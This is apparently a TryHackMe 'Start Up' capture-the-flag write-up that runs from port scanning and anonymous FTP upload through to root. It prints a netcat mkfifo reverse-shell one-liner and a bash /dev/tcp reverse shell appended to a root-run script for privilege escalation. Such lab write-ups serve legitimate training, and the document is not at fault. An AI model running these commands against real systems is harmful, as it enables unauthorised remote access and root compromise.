---
date: '2022-01-30'
title: Start Up
root: '/contents'
parents: ["TryHackMe"]
---

# Start Up

So, lets start with an nmap scan to look for any open ports.
## NMAP Scan 
![[Pasted image 20220130132141.png]]

We see 3 ports we can enumerate further with. FTP and http together what can go wrong?

Ports:
21 vsftpd 3.0.3
22 open SSH 7.2p2
80 Apache 2.4.18

Let's go into their webpage and see what we see.

## Web Server page
![[Pasted image 20220130132246.png]]

We are greeted with a page under development. So, let's do a directory scan with gobuster to see what directories are there.

## gobuster scan
![[Pasted image 20220130134051.png]]

We see a files directory an within that there is a subdirectory ftp, an image, and a txt file.

## /files directory in web server
![[Pasted image 20220130134251.png]]

And with the information from our nmap scan we can see that we can log into ftp with anonymous. Now, once we are in let's list directories with the command ls -la to see what we can find.

![[Pasted image 20220130142511.png]]

We see the usual 3 we saw earlier and a new one file which is .test.log which tells us we have write permission to upload files. So, let's change directory to ftp and upload a shell. Once, we get the php reverse shell in we just need to load the page on the browser with /files/ftp/shell.php this will pull up the CLI for us to activate the rev shell. 

We enter in the command rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc hostip 4444 >/tmp/f and get a netcat listener up. Let's look around to see what we can do. We find the recipe.txt on the root directory and if we go to home directory we can see the user.txt file for the user flag.

![[Pasted image 20220130142446.png]]

![[Pasted image 20220130143657.png]]


![[Pasted image 20220130144104.png]]

![[Pasted image 20220130150345.png]]

![[Pasted image 20220130150402.png]]

![[Pasted image 20220130153043.png]]

There is also a incident's folder that looks strange... As we investigate it we see a pcap file. We will need wireshark to view this. Once we get this open in wireshark we need to look for tcp data to follow so scroll down and the tcp stream to follow will be in the 170s range for user data information. Here, we can find Lennie's password.

With this information we can now ssh using lennie's credentials.

If we  go to user folder and check scripts folder we see a planner.sh, let's check the conents with nano. We see it calls a print.sh in etc directory. Let's go to that shell script and add 'bash -c "bash -i >& /dev/tcp/hostip/port 0>&1"' > /etc/print.sh

This will start another reverse shell that will grant us root once root privileges calls the script.

Start netcat listener on another terminal tab and now we are root!

We go to the root user folder and we see the root.txt file for our final flag.


